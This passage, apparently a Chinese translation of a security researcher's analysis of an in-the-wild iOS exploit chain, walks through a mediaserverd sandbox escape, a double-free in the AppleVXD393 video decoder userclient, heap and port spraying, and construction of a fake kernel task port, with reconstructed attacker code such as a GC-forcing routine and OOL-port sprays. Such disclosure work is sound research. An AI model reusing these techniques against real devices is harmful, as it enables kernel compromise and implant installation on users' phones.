  routine = FigRecorderRemoteServer_figrecorder_subsystem[method_index].stub_routine;

  if (routine_index &gt; 0x16 || !routine) `{`
    (mig_reply_error_t *)msg_reply-&gt;NDR = NDR_record_0;
    (mig_reply_error_t *)msg_reply-&gt;RetCode = MIG_BAD_ID;
    return FALSE;
  `}`

  (routine)(msg_request, msg_reply);
  return TRUE;
`}`
```

请注意，该过程确实返回一个值，指示消息是否已经传递给处理程序例程。但是，其CFMachPort处理程序会忽略它。CFMachPort处理程序也无法检查MIG返回代码是什么。当MIG方法失败时（因此，不应该保留任何资源的句柄），或msgh_id未被识别时（因此根本没有处理请求消息），则完全无法处理这些情况。这意味着，任何未预期的消息都将被忽略，而不是被正确地销毁（例如通过mach_msg_destroy），并且这些消息中包含的任何资源都将泄露到服务器进程中。

该漏洞利用发送一个msg_id为51的mach消息，FigRecorderRemoteServer_figrecorder_subsystem无法识别该消息，因此其中包含的任何资源都会立即泄露。

这一过程中，会发送带有1000个OOL内存描述符的mach消息，每个描述符包含10MB的包含堆喷射相同目标4kB内存块的副本。最终，希望其中一个能位于堆喷射目标地址0x120808000。接收到的OOL内存描述符的虚拟内存将由内核通过mach_vm_allocate在接收器中分配。这一过程使用非常基本的、从最低到最高的拟合算法进行分配。因此，这种堆喷射技术非常可靠，并且由于XNU在发送OOL内存时使用了虚拟内存优化，因此成本也很低。

除了喷射内存之外，还会喷射mach端口的发送权限。这里，再次滥用了com.apple.coremedia.recorder没有实现正确的MIG服务器的事实。该过程分配了超过12000个接收权限，会逐一分配一个发送权限，然后将接收权限集中到一个端口上。通过外部端口描述符将所有发送权限发送到服务，由于不正确的消息处理，该名称会立即泄露。

之所以发送这么多发送权限的原因，是希望能猜测出一个在mediaserverd任务中有效并且攻击者拥有接收权限的机器端口名称。然后，通过向该端口发送mach消息，就可以从目标中泄露资源（例如IOKit userclient连接）。



## JOP2ROP

我们之前看到的初始PC控制序列的末尾部分如下：

```
LDR  X8, [X0,#0x18]! ; read at offset +0x18, and bump up x0 to point to there
LDR  X8, [X8,#0x20]  ; X8 is controlled now; read function pointer
BLR  X8           ; PC control!
```

在该序列的开始处，X0指向bad wireid值得末尾，因此第一条指令将从0x0字节读取受控制的qword，经过wireid到X8。在内存操作数之后的!表明X0将被后处理（post-updated），这意味着在该指令使用这个值之后才会将其加上0x18。0x18字节已经超出了错误的wireid值，攻击者放入了堆喷射目标指针（0x120808080），因此X8的值为0x120808080，而X0是指向0x120808080的指针。

第二条指令将qword从0x120808080读入X8中，第三条指令调用该值。

这是堆喷射区域的带注释的转储，它实际上有三个不同的用途：

1、将初始JOP小工具指针放在已知位置；

2、转换为ROP栈；

3、包含要通过喷射的发送权限发送回攻击者进程的外联mach消息。

偏移量+000这里是堆喷射的目标地址0x120808080：

[![](https://p2.ssl.qhimg.com/t0160b56c6bb0a94072.png)](https://p2.ssl.qhimg.com/t0160b56c6bb0a94072.png)

local_ports[]数组中包含exfil mach消息的msgh_local_port字段的堆喷射目标页面上的地址。这就是ROP写入已打开的userclient端口的8个副本的地方。

这些消息本身也位于堆喷射页面上，其msgh_remote_port字段填充了端口喷射的发送权限的8个猜测。

在发送触发消息后，攻击者在端口上侦听包含所有喷射端口的信息。如果他们收到msgh_id值为0x1337的消息，则证明msgh_remote_port字段（回复端口）包含对视频解码加速器IOKit userclient的发送权限，该权限无法从沙箱内访问。



## 视频解码器加速器重复IOFree

这个内核漏洞位于AppleVXD393和D5500 userclient上，它们似乎负责某种涉及DRM和解密的视频解码。

我在研究iOS 12 beta 1版本的符号名称（当时Apple没有删除符号）时独立发现了这个漏洞，但当时已经在稳定版本中得到修复。当然，iOS内核通常在发布之前就已经被删去了符号，因此会采取一些逆向或模糊的方式来实现这一点。

userclient有9个外部方法：

AppleVXD393UserClient::_CreateDecoder<br>
AppleVXD393UserClient::_DestroyDecoder<br>
AppleVXD393UserClient::_DecodeFrameFig<br>
AppleVXD393UserClient::_MapPixelBuffer<br>
AppleVXD393UserClient::_UnmapPixelBuffer<br>
AppleVXD393UserClient::_DumpDecoderState<br>
AppleVXD393UserClient::_SetCryptSession<br>
AppleVXD393UserClient::_GetDeviceType<br>
AppleVXD393UserClient::_SetCallback

通常，任何具有外部方法的IOKit userclient都值得怀疑，这些外部方法的名称听起来像是加入了对象生命周期管理。Userclient的生命周期由两个地方进行隐式处理，分别是它拥有的mach端口的关系（当没有更多的客户端时，将导致没有发送者通知被发送）和OSObject引用，这将导致对象的破坏没有更多的引用。

通过查看方法列表，我们选择第二种。如果我们两次销毁解码器，会发生什么？

DestroyDecoder实现中的相关代码如下：

```
AppleVXD393UserClient::DestroyDecoder(__int64 this, __int64 a2, _WORD *out_buf) `{`
 ...
  char tmp_buf[0x68];
  // make a temporary copy of the structure at +0x270 in the UserClient object
  memmove(tmp_buf, (const void *)(this + 0x270), 0x68uLL);

  // pass that copy to ::DeallocateMemory
  err = AppleVXD393UserClient::DeallocateMemory(this, tmp_buf);
  if ( err ) `{`
    SMDLog("AppleVXD393UserClient::DestroyDecoder error deallocating input buffer ");
  `}`

  // if the flag at +0x2e5 is set; do the same thing for the structure at
  // +0x2F8
  if ( *(_BYTE *)(this + 0x2E5) )
  `{`
    bzero(tmp_buf, 0x68uLL);
    memmove(tmp_buf, (const void *)(this + 0x2F8), 0x68uLL);
    err = AppleVXD393UserClient::DeallocateMemory(this, tmp_buf);
    if ( err )
      SMDLog("AppleVXD393UserClient::DestroyDecoder error deallocating decrypt buffer ");
  `}`

  // then clear the flag for the second deallocate
  *(_BYTE *)(this + 0x2E5) = 0;
```

上述代码可能仍然没有什么问题，这取决于::DeallocateMemory实际执行的操作：

```
kern_return_t
AppleVXD393UserClient::DeallocateMemory(__int64 this, __int64 tmp_buf)
`{`
  // reading this+0x290 for the first case
  VXD_desc = *(VXD_DEALLOC **)(tmp_buf + 0x20);
  if ( !VXD_desc )
    return 0LL;

  err = AppleVXD393::deallocateKernelMemory(*(_QWORD *)(this + 0xD8),
                                            *(_QWORD *)(tmp_buf + 0x20));

  // unlink the buffer descriptor from a doubly-linked list:
  prev = VXD_desc-&gt;prev;
  if ( prev )
    prev-&gt;next = VXD_desc-&gt;next;
  next = VXD_desc-&gt;next;
  if ( next )
    v7 = &amp;next-&gt;prev;
  else
    v7 = (VXD_DEALLOC **)(this + 0x268); // head
  *v7 = prev;
  IOFree(VXD_desc, 0x38LL);
  return err;
`}`
```

```
__int64 __fastcall AppleVXD393::deallocateKernelMemory(__int64 this, VXD_DEALLOC *VXD_desc)
`{`
  __int64 err; // x19

  lck_mtx_lock(*(_QWORD *)(this + 0xD8));
  err = AppleVXD393::deallocateKernelMemoryInternal((AppleVXD393 *)this, VXD_desc);
  *(_DWORD *)(this + 0x2628) = 1;
  lck_mtx_unlock(*(_QWORD *)(this + 0xD8));
  return err;
`}`

AppleVXD393::deallocateKernelMemoryInternal(AppleVXD393 *this, VXD_DEALLOC *VXD_desc) `{`
  if ( !VXD_desc-&gt;iomemdesc ) `{`
    SMDLog("AppleVXD393::deallocateKernelMemory pKernelMemInfo-&gt;xfer NULLn");
    return 0xE00002C2;
  `}`
...
`}`
```

这是一个略微混淆的方法，下面是从VXDUserClient对象读取一个指向0x38字节结构的指针，我试图在这里进行重建：

```
0x38 byte struct structure `{`
// virtual method will be called if size_in_pages non-zero
+0  = IOMemoryDescriptor ptr
// virtual release method will be called if non-zero
+8  = another OS_object
+10 = unk
+18 = size_in_pages
+20 = maptype
+28 = prev_ptr
+30 = next_ptr
`}`
```

指向这种结构的指针被传递给AppleVXD393::deallocateKernelMemory，后者又调用AppleVXD393::deallocateKernelMemoryInternal。如果第一个成员（应该是IOMemoryDescriptor指针）为NULL，那么将会返回。随后，在AppleVXD393UserClient::DeallocateMemory中，在通过IOFree释放之前，该结构将从双向链接列表（明显缺乏安全取消链接机制）取消链接。

没有任何过程清除了VXDUserClient指针+0x290的位置，这是指向这个0x38字节结构的指针。因此，如果多次调用外部方法，则每次都会将相同的指针传递给::deallocateKernelMemory，然后传递给IOFree。这就是漏洞利用中所使用的漏洞。



## 内核利用

请注意，安全地触发重复释放有一些限制。特别是，如果第一个指针值不为NULL，并且size_in_pages字段不为0，那么将会在IOMemoryDescriptor上调用虚拟方法。<br>
该条目每次解除分配时都会从列表中取消链接，因此需要设置prev和next指针才能生存。（NULL是一个合适的安全值。）

攻击者像往常一样，通过增加打开文件描述符的限制并创建0x800管道来开始漏洞利用。他们还分配了1024个早期端口以及一个IOSurface。这次，IOSurface将像在iOS漏洞利用链#1中一样，用作修饰OSObjects的方法。

将分配4个mach端口（接收1到4），然后强制区域GC。



## 击破mach_zone_force_gc以消除漏洞缓解

Apple完全删除了mach_zone_force_gc主机端口MIG方法，因此现在没有直接强制区域GC的方法。

区域GC仍然是必要的功能，因此我们需要更具创造性。区域GC仍然会在内存空间接近不足时发生，因此要导致区域GC，必须先导致内存压力。攻击者是这样实现的：

```
#define ROUND_DOWN_NEAREST_1MB_BOUNDARY(val) ((val &gt;&gt; 20) &lt;&lt; 20)

void force_GC()
`{`

  long page_size = sysconf(_SC_PAGESIZE);
  target_page_cnt = n_actually_free_pages();

  size_t fifty_mb = 1024*1024*50;

  size_t bytes_size = (target_page_cnt * page_size) + fifty_mb;
  bytes_size = ROUND_DOWN_NEAREST_1MB_BOUNDARY(bytes_target)

  char* base = mmap(0,
                    bytes_size,
                    PROT_READ | PROT_WRITE,
                    MAP_ANON | MAP_PRIVATE,
                    -1,
                    0);
  if (!base || base == -1) `{`
    return;
  `}`

  for (i = 0; i &lt; bytes_size / page_size; ++i ) `{`
     // touch each page
    base[page_size * i] = i;
  `}`
  n_actually_free_pages();

  // wait for GC...
  sleep(1);

  // remove memory pressure
  munmap(base, bytes_target);
`}`
```

```
uint32_t n_actually_free_pages()
`{`
  struct vm_statistics64 stats = `{`0`}`;
  mach_msg_number_t statsCnt = HOST_VM_INFO64_COUNT;

  host_statistics64(mach_host_self(),
                    HOST_VM_INFO64,
                    &amp;stats,
                    &amp;statsCnt);

  return (stats.free_count - stats.speculative_count);
`}`
```

这比以前的方法要慢很多，但确实有效。攻击者对剩余的其他利用链也延续了这种方法。



## Heap Grooming

对于第四个端口，他们使用熟悉的函数发送两个kalloc_groomer消息，一个用于0x20000 kalloc（0x38）调用，另一个用于0x2000 4k kalloc调用。它们会填充堆中的任意空隙，以确保来自这些区域的后续分配可能来自新页面。

攻击者执行一个mach端口修饰，分配10240个before_ports、一个目标端口、5120个after_ports。这样一来，就形成了类似于iOS漏洞利用链#2中IOSurface的情况，在漏洞利用过程中，大量其他端口分配中间有一个目标端口：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e0896f5354c25b12.png)

该过程将一个外部端口描述符中的目标端口发送到第三个端口，在那里存储引用（意味着target_port现在的引用计数为2）。这里同样类似于IOSurface漏洞利用中使用的技术。

随后，在userclient上调用外部方法0，即CreateDecoder，将会产生0x38字节目标缓冲区被分配，将指针存储在userclient +0x290的位置。

然后将调用外部方法1，即DestroyDecoder。这里的kfree是刚刚分配的0x38字节结构，但是在+0x290的userclient中没有指向它的指针。

攻击者使用IOSurface属性技巧来反序列化0x400 OSData对象的OSArray，其中每个OSData对象都是一个0x38字节的零缓冲区。它会附加到IOSurfaceRootUserClient中，键为“spray_56”。其中，56是十进制的0x38，也就是目标分配的大小。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014fbbab5ac5e7b1b2.png)

这里的想法是，其中一个OSData对象的后备缓冲区是在freeClient仍然有悬空指针的释放后0x38字节结构分配上分配的。由于它们将内容设置为NULL，因此将继续被userclient再次销毁，这正是第二次调用DestroyDecoder时发生的情况：

```
IOConnectCallStructMethod(
         userclient_connection,
         1LL, // AppleVXD393UserClient::DestroyDecoder
              // free one of the OSData objects
         IOConnect_struct_in_buf,
         struct_in_size,
         IOConnect_struct_out_buf,
         &amp;struct_out_size);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013a7039833651e263.png)

此时，VXD393UserClient和OSData对象都有悬空指针到释放后的分配。将会第二次重新分配缓冲区，但这次有所不同：

```
// send 7 ports; will result in a 0x38 byte kalloc alloc
bzero(ool_ports_desc, 28LL);
ool_ports_desc[1] = target_port;
send_a_mach_message_with_ool_ports_descs(
    second_receive,
    ool_ports_desc,
    7,
    0x190);
```

这次他们发送带有0x190 OOL_PORTS描述符的mach消息，每个描述符有7个端口名，所有这些都是MACH_PORT_NULL，与第二个名称不同。正如我们在IOSurface漏洞中看到的那样，这将导致0x38字节的kalloc分配（0x38 = 7 * 0x8），其中第二个qword是指向target_port的struct ipc_port的指针：

[![](https://p5.ssl.qhimg.com/t0102b5e3b6cbf848d7.png)](https://p5.ssl.qhimg.com/t0102b5e3b6cbf848d7.png)



## 公开指针

我们希望其中的一个0x190外部端口描述符与OSData后备缓冲区和VXD393UserClient 0x38字节结构缓冲区重叠。

现在，他们通过IOSurface读取属性方法来读取所有OSData缓冲区的内容，并查找内核指针。请注意，所有OSData缓冲区的内容最初都是0。

```
iosurface_get_property_wrapper(spray_56_str,
                               big_buffer,
                               &amp;buffer_size_in_out);
found_at = memmem(big_buffer, buffer_size_in_out, "xFFxFFxFF", 3);
```

“xFFxFFxFF”签名将匹配内核指针的较高三个字节。唯一将被序列化的内核指针是target_port的地址，这意味着他们已经成功公开了目标端口的内核地址。



## 重复释放导致额外端口引用丢弃

然后，第三次触发漏洞，留下三个悬空的指针：一个在userclient中，一个在OSData中，另一个在传输的mach消息的外部端口描述符端口指针中。

需要注意的是，这里触发漏洞仍然是安全的，因为只有第二个qword非零。第一个指针（IOMemoryDescriptor*）仍然为NULL，因此AppleVXD393::deallocateKernelMemoryInternal将会提前返回，列表取消链接的过程将成功进行，因为prev和next指针都为NULL。



## 第三次替换

攻击者对另一个OSData对象数组进行序列化。这次他们所公开的目标端口内核地址的两个副本位于缓冲区中，然后再将它们连接到IOSurfaceUserClient：

```
os_data_spray_buf_ptr[0] = target_port_kaddr;
os_data_spray_buf_ptr[1] = target_port_kaddr;

serialize_array_of_data_buffers(&amp;another_vec, os_data_spray_buf, 0x38u, 800);
```

具体发生了什么？

正如我们在之前的利用链中所看到的，传输中的外部端口描述符中的每个端口指针都有一个引用。我们可以在XNU源的ipc_kmsg.c中的ipc_kmsg_copyin_ool_ports_descriptor看到此逻辑。

发送的消息的“真实”外部端口描述符缓冲区只有一个指向端口的指针。因此，它只在端口上进行了一次引用。但现在，已经将指针加倍，描述符缓冲区有两个副本，但只需要一个额外的引用。

当描述缓冲区被销毁时（例如：当发送它的端口被销毁而没有收到消息时），内核将遍历描述符中的每个指针，如果它不是NULL，将删除一个引用：

```
ipc_kmsg_clean_body(...
...
  case MACH_MSG_OOL_PORTS_DESCRIPTOR : `{`
    ipc_object_t* objects;
    mach_msg_type_number_t j;
    mach_msg_ool_ports_descriptor_t* dsc;

    dsc = (mach_msg_ool_ports_descriptor_t*)&amp;saddr-&gt;ool_ports;
    objects = (ipc_object_t *) dsc-&gt;address;

    if (dsc-&gt;count == 0) `{`
      break;
    `}`

    /* destroy port rights carried in the message */

    for (j = 0; j &lt; dsc-&gt;count; j++) `{`
      ipc_object_t object = objects[j];

      if (!IO_VALID(object))
        continue;

      // drop a reference
      ipc_object_destroy(object, dsc-&gt;disposition);
    `}`

    /* destroy memory carried in the message */
    kfree(dsc-&gt;address, (vm_size_t) dsc-&gt;count * sizeof(mach_port_t));
```

这正是销毁OOL_PORTS描述符发送到的端口时，即将发生的情况：

```
mach_port_destroy(mach_task_self(), second_receive);
```

这样一来，就会产生在target_port上删除额外引用的效果，在这种情况下，会留下两个指向target_port的指针（一个在任务的端口命名空间表中，另一个在发送到third_receive的外部端口描述符中），但只有一个引用。

现在，攻击者重新创建了在IOSurface漏洞利用中的相同情况：即将获得一个悬空的mach端口指针，但来自于截然不同的初始原语。在这种情况下，漏洞本身就给他们一个指向mach端口结构的悬空指针。在这里，从不同区域的重复释放漏洞中重新创建了相同的原语，这是有所不同的地方。

我们现在看到，其余代码与IOSurface漏洞利用非常接近。这就是边际成本的一个例子，开发每个额外的漏洞利用链的成本要低于开发首个利用链的成本。许多组件可以重复使用，只有在引入时才能消除缓解，或者如果缓解不存在于关键路径中，可以开发新的技术。



## 加入漏洞利用链

此时的代码几乎是完全从IOSurface漏洞利用中复制粘贴而来。

该过程会破坏before_ports、third_receive（导致target_port被释放），然后是after_ports，并使用新方法执行GC。此时，target_port正在悬空，并且它所在的区域块已准备好由不同的区域重新分配。

他们尝试使用较小的外联内存区域替换，这些区域将对应于kalloc.4096分配，将ip_context字段与包含循环迭代的标记重叠。

每次循环时，都会检查上下文字段是否被更改，这意味着ipc_port缓冲区被重新分配为外联存储器描述符后备缓冲区。它们释放了发送正确描述符的特定端口，并尝试重新分配0x800管道缓冲区，每个缓冲区都填充了虚假端口，其上下文值设置为标识映射到的fd。

一旦确定了这一点，就可以构建一个虚假的IKOT_CLOCK端口，并强制使用KASLR Slide，然后使用它们构建初始虚假任务的偏移量并进行读取。

这一次，攻击者使用了更加优化的方法来构建虚假的内存任务。指定kernel_task指针的偏移量，使用bootstrap读取来获取指向内核任务的指针，从中读取指向内核任务端口的指针和指向内核vm_map的指针。

根据内核任务端口，他们读取偏移量+0x60处的字段，这是端口中的空间，在本例中为itk_space_kernel。

上述就是在管道缓冲区中构建虚假内核任务端口和虚假内核任务所需的全部内容，这样就可以为内核内存提供读写操作。



## 后期漏洞利用

后期利用阶段保持不变。修补平台的策略允许从/tmp执行，将植入工具的CDHash添加到内核信任缓存中，替换凭据以暂时转义沙箱，并将植入工具posix_spawn以root身份运行，最后切换回原始凭据。

攻击者将字符串“iop114”放置在bootargs中，我们看到攻击者在权限提升漏洞利用开始时对其进行正确读取，已确认漏洞利用是否已经成功执行。



## 附录A：未使用但已经解析的符号列表

asl_log_message<br>
sel_registerName<br>
CFArrayCreateMutable<br>
CFDataCreate<br>
CFArrayAppendValue<br>
CFDictionaryCreate<br>
CFDictionaryAddValue<br>
CFStringCreateWithFormat<br>
CFRelease<br>
CFDataGetBytePtr<br>
CFDataGetLength<br>
bootstrap_look_up2<br>
stat<br>
usleep<br>
open<br>
CFWriteStreamCreateWithFTPURL<br>
CFWriteStreamOpen<br>
CFWriteStreamWrite<br>
CFWriteStreamClose<br>
unlink<br>
sprintf<br>
strcat<br>
copyfile<br>
removefile<br>
task_suspend<br>
task_name_for_pid<br>
mach_port_mod_refs<br>
pthread_create<br>
pthread_join<br>
_IOHIDCreateBinaryData<br>
io_hideventsystem_open<br>
mlock<br>
mig_get_reply_port<br>
mach_vm_read_overwrite<br>
mach_ports_lookup<br>
vm_allocate<br>
mach_port_kobject<br>
IOMasterPort<br>
kCFTypeArrayCallBacks

下面介绍一些有趣的内容。当然，我们不可能知道这些是从开发中遗漏的，还是实际上在第二个框架的早期漏洞利用中使用的。但是，后面的两条利用链（#4和#5）使用相同的符号列表，仅添加了它们所需的符号。

下面的符号似乎很有趣，这些符号也可能用于在沙箱逃逸中的ROP栈中。

m锁：

mlock指向两个可能的地方，曾经被用于确保用户空间页面在触发用户空间取消引用时不会被交换。mlock还参与了代码签名绕过，可能它在ROP链中用于引导Shellcode执行。

mach_port_kobject：

在Stefen Esser的博客文章中，详细讨论了这个内核MIG方法。在iOS 6版本之前，它将返回所提供的mach端口的ip_kobject字段。在iOS 6中，一些混淆被添加到返回的指针中，但正如Stefen指出的那样，容易被破解。

io_hideventsystem_open：

HID驱动程序和hideventsystem服务本身也存在许多漏洞。有关漏洞利用，可以参考 [https://bugs.chromium.org/p/project-zero/issues/detail?id=1624](https://bugs.chromium.org/p/project-zero/issues/detail?id=1624) 。这可能与攻击者同时引入的IOHIDCreateBinaryData有关。
